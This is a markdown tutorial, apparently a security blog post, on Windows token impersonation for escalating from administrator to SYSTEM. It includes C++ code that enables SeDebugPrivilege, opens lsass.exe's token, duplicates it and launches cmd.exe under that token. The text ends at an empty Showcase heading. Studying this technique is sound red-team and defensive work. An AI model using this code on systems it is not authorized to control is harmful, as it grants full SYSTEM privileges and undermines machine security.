# System Token Impersonation

## Tokens

Each process has its own corresponding [_EPROCESS](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2110%2021H2%20(November%202021%20Update)/_EPROCESS) in kernel, it contains all the information about a process, includin it's PID, loaded modules, virtual address space and much more information. Today we will focus on a field which can be found deep down in _EPROCESS, which is the [_TOKEN](https://www.vergiliusproject.com/kernels/x64/Windows%2010%20%7C%202016/2110%2021H2%20(November%202021%20Update)/_TOKEN) structures. It contains a token that contains the information about the rights a process has, it tells wether a process runs as user, admin or system. We will now focus on going from admin to system.

## Steps

Before doing anything else, we will need to grant our own process the `SeDebugPrivilege` privilege, it is the highest rights a usermode process can have. We can do so by looking up the `LUID` value corresponding to SeDebugPrivilege by using `LookupPrivilegeValueA`. We can then set the luid of our own token to it and call `AdjustTokenPrivileges` to apply the new token to ourselves :

```cpp
bool enable_debug_priv(HANDLE hToken)
{
	TOKEN_PRIVILEGES token_priv;
	LUID luid;

	if (!LookupPrivilegeValueA(0, "SeDebugPrivilege", &luid))
		return false;

	token_priv.PrivilegeCount = 1;
	token_priv.Privileges[0].Luid = luid;
	token_priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (AdjustTokenPrivileges(hToken, FALSE, &token_priv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)0, (PDWORD)0))
		return true;
	else
		return false;
}
```
\
Our target process needs to have system rights, we will need to open a handle to it, and to it's token. Of course, we can't do these to the system process with pid 4. However we can do it on other processes that have the required rigths such as `winloging.exe` or `lsass.exe`. Here is the general idea :

![image](https://media.discordapp.net/attachments/780153367305256981/1019982190114766929/unknown.png?width=593&height=605)
\

In this example we first open a handle to lsass with the most limited information possible which are PROCESS_QUERY_INFORMATION. We can then open a handle to the token of that process using `OpenProcessToken` with flags, the main one being TOKEN_DUPLICATE which we will need later. We then call `ImpersonateLoggedOnUser` which is needed for token impersonation. So far we have this :

```cpp
OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, PID);
OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken);
ImpersonateLoggedOnUser(hToken);
```


Now for the most intereseting part, we will use `DuplicateTokenEx` to, as the name suggests, duplcate the token of the target process and store it: 

```cpp
DuplicateTokenEx(hToken, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY |
    TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, 0, SecurityImpersonation, TokenPrimary, &hDupToken);
```

We can then use the `CreateProcessWithTokenW` (no ANSI version 👎) to spwan a process, and specify the token that it wll have when created. We wll supplu the token we duplcated earlier : 

```cpp
CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", 0, 0, 0, 0, 
    (LPSTARTUPINFOW)&startup_info, &process_info);
```

## Showcase
